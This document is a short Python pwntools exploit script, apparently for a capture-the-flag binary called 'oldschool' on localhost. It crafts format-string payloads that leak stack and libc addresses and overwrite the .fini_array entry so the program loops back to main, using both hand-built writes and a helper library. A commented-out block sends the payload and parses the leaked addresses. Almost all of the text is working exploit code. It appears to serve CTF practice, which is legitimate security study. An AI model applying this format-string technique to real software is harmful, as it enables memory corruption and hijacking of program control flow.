#!/usr/bin/env python3
from bu6pwn.FSB import FSB
from pwn import *

HOST = "127.0.0.1"
PORT = 1337

context.log_level="INFO"

addr_main       = 0x0804849b
addr_fini_arr   = 0x080496dc

exploit = b'%2$08x%264$08x@@'
l=len(exploit)
exploit += p32(addr_fini_arr+2) + p32(addr_fini_arr) + b"%%%d" % (0x804-26) + b"c" + b"%11$hn"+ b"%%%d" % (0x849b-0x804) + b"c" + b"%12$hn"
exploit2 = b'%2$08x%264$08xxx'
l2=len(exploit2)

fsb = FSB(header=len(exploit2),count=16, size=2, debug=False)
fsb.set_adrval(addr_fini_arr, addr_main)
fsb.auto_write(index=7)
exploit2 += fsb.get()
#print("OWN{}: {}".format(l,exploit))
#print("FSB{}: {}".format(l2,exploit2))

"""
s=process("/home/cr0c0/Desktop/oldschool/oldschool")
pause()
s.send(exploit+b"\r\n")
garbage=s.recvall()
libc_leak = int(garbage[:38].decode().split(":")[2][:8], 16)
stack_leak = int(garbage[:38].decode().split(":")[2][8:], 16)
log.info("Stack: 0x{:#x}\nLibc: 0x{:#x}".format(stack_leak, libc_leak))
s.close()
"""
